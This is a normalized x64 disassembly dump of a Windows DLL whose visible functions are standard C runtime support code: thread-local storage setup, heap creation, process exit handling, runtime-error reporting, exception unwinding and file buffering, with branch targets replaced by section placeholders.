mov rcx rdx
mov rsi r9
mov rbx r8
mov rdi rdx
call sub_18000d180
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov r9 [ rsp + 0x90 ]
mov ecx 0x7fffffff
mov r8 rsi
cmp rax rcx
mov rdx rbx
mov [ rsp + 0x48 ] 0x49
cmova eax ecx
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x38 ] eax
call rbp
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
sub_180006318
mov r11 rsp
mov [ r11 + 0x10 ] rdx
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
mov r8 rdx
lea rax [ r11 + 0x18 ]
mov rdx rcx
lea rcx [ sub_18000d2e8 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_180006274
add rsp 0x38
retn
sub_180006350
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
mov ecx edx
call sub_1800074f4
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_180006a4c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_18000674c
mov edx 0x2c8
mov ecx 0x1
call sub_180006b3c
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_18000ea14
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_18000e860
mov [ rw-data ] rax
call sub_18000bc94
test eax eax
jns r-xdata
call sub_180007540
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_180006a0c
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_18000706c
call sub_18000e768
test eax eax
js r-xdata
call sub_180006750
jmp r-xdata
call sub_180004690
jmp r-xdata
xor edx edx
call sub_180006778
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
call sub_18000bf84
call sub_180006750
call sub_180007540
jmp r-xdata
call sub_18000bf84
jmp r-xdata
call sub_18000e468
test eax eax
js r-xdata
xor ecx ecx
call sub_180006e24
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_18000648c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180001000
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
test eax eax
je r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180006350
mov [ rsp + 0x20 ] eax
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180006350
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180001000
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180006350
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000648c
call sub_18000ec78
sub_1800065e4
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov r11 [ rw-data ]
mov [ rsp + 0x58 ] r11
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_18000ed2c
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_18000ed2c
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_180006778
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_18000bc50
nop
mov rax [ rbx + 0xb8 ]
[ rax ] 0x1
mov ecx 0xd
call sub_18000bb50
mov ecx 0xc
call sub_18000bc50
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_18000ca78
nop
mov ecx 0xc
call sub_18000bb50
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_18000682c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_180006b3c
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_180004690
xor ebx ebx
xor edx edx
call sub_180006778
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_1800068d4
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_180004690
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_180004690
mov ecx 0xd
call sub_18000bc50
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_180004690
mov ecx 0xd
call sub_18000bb50
mov ecx 0xc
call sub_18000bc50
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ] 0xffffffff
jne r-xdata
mov ecx 0xc
call sub_18000bb50
mov rcx rbx
call sub_180004690
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_18000cb10
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_180004690
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_18000c8fc
nop
sub_180006a0c
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_1800068d4
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_180006a4c
push rbx
sub rsp 0x20
call sub_18000707c
call sub_18000ba40
test eax eax
je r-xdata
call sub_180006750
xor eax eax
lea rcx [ sub_1800068d4 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_180006b3c
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_180006778
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180006ad0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rsi rcx
or ebp 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi ebp
cmp edi ebp
jne r-xdata
mov rcx rsi
call sub_180004454
mov rbx rax
test rax rax
jne r-xdata
sub_180006b3c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_18000ed34
mov rbx rax
test rax rax
jne r-xdata
sub_180006bc0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_18000450c
mov rbx rax
test rax rax
jne r-xdata
sub_180006c48
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
or r13d 0xffffffff
mov r12 rcx
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r13d
cmp esi r13d
jne r-xdata
mov r8 rdi
mov rdx rbp
mov rcx r12
call sub_18000ede4
mov rbx rax
test rax rax
jne r-xdata
sub_180006cd0
sub rsp 0x38
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapSize@IAT ]
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or rax 0xffffffffffffffff
jmp r-xdata
add rsp 0x38
retn
sub_180006d48
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_180006db4
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_180006de8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_180006e24
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_18000ee80
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180006de8
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call sub_18000ef40
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_18000ea4c ]
call sub_18000443c
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ rw-data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_18000ef40
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_180006ed4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_18000bc50
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
test r12d r12d
jne r-xdata
mov ecx 0x8
call sub_18000bb50
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180006db4
nop
mov rcx [ rw-data ]
call DecodePointer
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov [ rw-data ] 0x1
lea ecx [ r12 + 0x8 ]
call sub_18000bb50
mov ecx r15d
call sub_180006d48
mov ecx r15d
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180006db4
mov rcx [ rw-data ]
call DecodePointer
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
cmp rdi rsi
jb r-xdata
call __imp_EncodePointer
cmp [ rdi ] rax
jne r-xdata
mov rcx [ rdi ]
call DecodePointer
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
mov rcx [ rw-data ]
call DecodePointer
cmp r14 rbx
jne r-xdata
jmp r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
cmp r13 rax
je r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
jmp r-xdata
sub_18000707c
push rbx
sub rsp 0x20
call __imp_EncodePointer
mov rcx rax
mov rbx rax
call sub_180007630
mov rcx rbx
call sub_18000f298
mov rcx rbx
call sub_180008400
mov rcx rbx
call sub_18000f290
mov rcx rbx
call sub_18000f288
mov rcx rbx
call sub_18000efe8
mov rcx rbx
call sub_18000ea84
mov rcx rbx
call sub_18000efcc
lea rcx [ sub_180007060 ]
call EncodePointer
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
sub_1800070e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r12 [ r9 ]
mov rsi [ r9 + 0x38 ]
sub r12 r15
test [ rcx + 0x4 ] 0x66
mov r14 r9
mov rbp rdx
mov r13 rcx
jne r-xdata
mov rdi [ r9 + 0x20 ]
xor ebp ebp
sub rdi r15
cmp [ rsi ] ebp
jbe r-xdata
xor edi edi
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] r8
cmp [ rsi ] edi
jbe r-xdata
mov eax 0x1
lea rbx [ rsi + 0x10 ]
lea rbx [ rsi + 0xc ]
inc ebp
add rbx 0x10
cmp ebp [ rsi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jae r-xdata
inc edi
add rbx 0x10
cmp edi [ rsi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r12 rax
jae r-xdata
mov ecx [ rbx - 0xc ]
cmp r12 rcx
jb r-xdata
cmp rdi rcx
jb r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
cmp rdi rax
jae r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
mov rdx [ rsp + 0x78 ]
add rax r15
mov cl 0x1
mov [ r14 ] rax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
mov eax [ rbx ]
cmp rdi rax
je r-xdata
test [ r13 + 0x4 ] 0x20
jne r-xdata
cmp [ r13 ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx rbp
add rax r15
call rax
test eax eax
js r-xdata
jmp r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx rbp
add rcx r15
call sub_1800089d0
mov rax [ r14 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ r13 ]
mov [ rsp + 0x28 ] rax
mov rax [ r14 + 0x28 ]
add rdx r15
mov r8 r13
mov rcx rbp
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_180008a00
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
lea rcx [ r--data ]
call sub_18000ef40
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx r13
call [ r--data ]
sub_180007288
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r13
push r14
sub rsp 0x30
lea r14 [ rw-data ]
mov edi ecx
xor ebx ebx
mov rax r14
cmp ebx 0x17
jae r-xdata
inc ebx
add rax 0x10
cmp ebx 0x17
jb r-xdata
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x50 ]
mov r13 [ rsp + 0x58 ]
add rsp 0x30
pop r14
retn
mov ecx 0x3
call sub_18000f69c
cmp eax 0x1
je r-xdata
cmp ecx [ rax ]
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov ecx 0x3
call sub_18000f69c
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
movsxd rbx ebx
add rbx rbx
mov rcx [ r14 + rbx * 8 + 0x8 ]
call sub_18000d180
mov rdx [ r14 + rbx * 8 + 0x8 ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
mov r8 rax
mov rcx rdi
call [ WriteFile@IAT ]
lea rdi [ rw-data ]
mov r13d 0x314
lea r8 [ r--data ]
mov rcx rdi
mov rdx r13
call sub_18000f628
test eax eax
je r-xdata
lea rdx [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
lea rcx [ rw-data ]
call sub_18000d180
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
lea rcx [ rw-data ]
mov edx 0x2fb
call sub_18000f628
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r13
mov rcx rdi
call sub_18000f4c4
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_18000d180
lea rdx [ rw-data ]
lea r8 [ r--data ]
lea rcx [ rax + rdi - 0x22 ]
mov r9d 0x3
sub rdx rcx
call sub_18000f550
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
movsxd r8 ebx
mov rdx r13
mov rcx rdi
add r8 r8
mov r8 [ r14 + r8 * 8 + 0x8 ]
call sub_18000f4c4
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rdi
call sub_18000f2d0
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
sub_1800074b0
sub rsp 0x28
mov ecx 0x3
call sub_18000f69c
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_180007288
mov ecx 0xff
call sub_180007288
mov ecx 0x3
call sub_18000f69c
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1800074f4
mov [ rsp + 0x8 ] ecx
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
mov rcx rax
mov [ rsp + 0x30 ] 0x2
call [ HeapSetInformation@IAT ]
mov eax 0x1
sub_180007560
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_1800075e8
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000682c
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_180007560
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_18000682c
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_180007638
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000766c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_180009454
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_1800075a8
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_1800075a8
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_1800054ec
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_18000b7f8
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
cmp ebp edi
mov [ rbx + 0x8 ] eax
jle r-xdata
mov ecx esi
call sub_18000f910
cmp eax edi
jne r-xdata
call sub_1800054ec
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_18000b7f8
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_18000f8bc
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_18000f784
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_1800077fc
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
add [ rdx + 0x8 ] 0xffffffff
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_18000766c
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
